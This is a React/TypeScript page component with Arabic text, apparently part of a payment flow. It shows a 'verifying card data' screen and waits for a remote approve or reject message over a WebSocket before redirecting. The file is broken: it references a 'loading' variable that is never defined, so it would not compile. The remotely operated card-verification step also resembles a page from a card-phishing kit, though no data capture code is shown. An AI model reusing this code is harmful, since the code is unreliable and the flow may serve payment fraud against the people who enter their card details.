import { useState, useEffect } from "react";
import { ShieldCheck, CheckCircle, XCircle, ArrowRight, AlertCircle, Loader2 } from "lucide-react";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { useWebSocket } from "@/context/WebSocketContext";

function getQueryParam(key: string): string | null {
  const params = new URLSearchParams(window.location.search);
  return params.get(key);
}

type VerificationStatus = "pending" | "approved" | "rejected";

export default function PayOtpPage() {
  const applicationId = getQueryParam("applicationId");
  const sessionId = getQueryParam("session");
  const [status, setStatus] = useState<VerificationStatus>("pending");
  const [message, setMessage] = useState<string>("");
  const { subscribe } = useWebSocket();

  useEffect(() => {
    if (!applicationId) {
      setMessage("معرف الطلب غير موجود");
      setStatus("rejected");
      return;
    }

    // الاشتراك في تحديثات حالة الدفع
    const unsubscribe = subscribe(`app_${applicationId}`, (data: any) => {
      if (data.type === "payment_status_update") {
        if (data.paymentStatus === "completed") {
          setStatus("approved");
          setMessage("تمت الموافقة على الدفع! جاري التحويل...");
          setTimeout(() => {
            window.location.href = "/apply/success";
          }, 2000);
        } else if (data.paymentStatus === "failed") {
          setStatus("rejected");
          setMessage("تم رفض الدفع. البيانات غير صحيحة.");
        } else if (data.paymentStatus === "approved") {
          setStatus("approved");
          setMessage("تمت الموافقة!");
          setTimeout(() => {
            window.location.href = "/apply/success";
          }, 2000);
        }
      }
    });

    setMessage("جاري التحقق من بيانات البطاقة...");

    return () => {
      unsubscribe();
    };
  }, [applicationId, sessionId, subscribe]);

  return (
    <div className="min-h-screen flex flex-col bg-primary">
      <Navbar />
      
      <main className="flex-1 flex items-center justify-center p-4">
        <div className="w-full max-w-md">
          <div className="bg-white/10 backdrop-blur-lg rounded-3xl p-8 shadow-2xl">
            <div className="text-center mb-8">
              <div className={`w-20 h-20 mx-auto rounded-full flex items-center justify-center mb-4 ${
                status === "approved" ? "bg-green-500" :
                status === "rejected" ? "bg-red-500" :
                "bg-accent"
              }`}>
                {loading ? (
                  <Loader2 className="w-10 h-10 text-primary animate-spin" />
                ) : status === "approved" ? (
                  <CheckCircle className="w-10 h-10 text-white" />
                ) : status === "rejected" ? (
                  <XCircle className="w-10 h-10 text-white" />
                ) : (
                  <ShieldCheck className="w-10 h-10 text-primary" />
                )}
              </div>
              
              <h1 className="text-2xl font-bold text-white mb-2">
                {status === "approved" ? "تمت الموافقة" :
                 status === "rejected" ? "تم الرفض" :
                 "جاري التحقق"}
              </h1>
              
              <p className="text-white/80">{message}</p>
            </div>

            {status === "rejected" && (
              <div className="space-y-4 mt-6">
                <div className="bg-red-500/20 border border-red-500/30 rounded-xl p-4 text-center">
                  <AlertCircle className="w-6 h-6 text-red-400 mx-auto mb-2" />
                  <p className="text-white/90 text-sm">
                    يرجى التواصل مع البنك أو المحاولة مرة أخرى
                  </p>
                </div>
                
                <button
                  onClick={() => window.history.back()}
                  className="w-full bg-gradient-to-l from-accent to-[#e0b95b] hover:from-[#e0b95b] hover:to-accent text-primary font-bold py-4 rounded-xl transition-all flex items-center justify-center gap-2"
                >
                  <ArrowRight className="w-5 h-5" />
                  العودة والمحاولة مرة أخرى
                </button>
              </div>
            )}

            {status === "approved" && (
              <div className="text-center mt-6">
                <p className="text-white/80 text-sm">
                  سيتم توجيهك تلقائياً...
                </p>
              </div>
            )}

            {status === "pending" && (
              <div className="mt-6">
                <div className="flex items-center justify-center gap-2 text-white/60 text-sm">
                  <div className="w-2 h-2 bg-accent rounded-full animate-pulse"></div>
                  <div className="w-2 h-2 bg-accent rounded-full animate-pulse" style={{ animationDelay: "0.2s" }}></div>
                  <div className="w-2 h-2 bg-accent rounded-full animate-pulse" style={{ animationDelay: "0.4s" }}></div>
                </div>
                <p className="text-center text-white/60 text-sm mt-4">
                  يرجى الانتظار حتى يتم التحقق من بياناتك
                </p>
              </div>
            )}
          </div>
        </div>
      </main>
      
      <Footer />
    </div>
  );
}
